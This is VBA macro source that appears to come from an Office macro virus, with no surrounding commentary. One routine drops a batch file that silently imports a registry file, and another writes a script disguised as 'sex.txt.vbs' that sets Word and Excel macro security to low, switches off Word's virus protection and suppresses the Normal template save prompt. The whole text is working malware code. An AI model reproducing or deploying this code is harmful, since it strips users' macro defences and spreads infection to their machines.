Sub Siluman()
Open "\fix.bat" For Output As #1
Print #1, "regedit /s \windows.reg"
Close #1
End Sub
Sub Dhemit()
Open "\sex.txt.vbs" For Output As #1
Print #1, "Dim WSH"
Print #1, "Set WSH = WScript.CreateObject("; """WScript.Shell"""; ")"
Print #1, "WSH.RegWrite "; """HKCU\Software\Microsoft\Office\10"; "."; "0\Word\Security\Level"""; ", 1, "; """REG_DWORD"""
Print #1, "WSH.RegWrite "; """HKCU\Software\Microsoft\Office\10"; "."; "0\Excel\Security\Level"""; ", 1, "; """REG_DWORD"""
Print #1, "WSH.RegWrite "; """HKCU\Software\Microsoft\Office\9"; "."; "0\Word\Security\Level"""; ", 1, "; """REG_DWORD"""
Print #1, "WSH.RegWrite "; """HKCU\Software\Microsoft\Office\9"; "."; "0\Excel\Security\Level"""; ", 1, "; """REG_DWORD"""
Print #1, "Set WWA = WScript.CreateObject("; """Word.application"""; ")"
Print #1, "WWA.Options.VirusProtection = False"
Print #1, "WWA.Options.SaveNormalPrompt = False"
Print #1, "WWA.Application.Quit"
Close #1
End Sub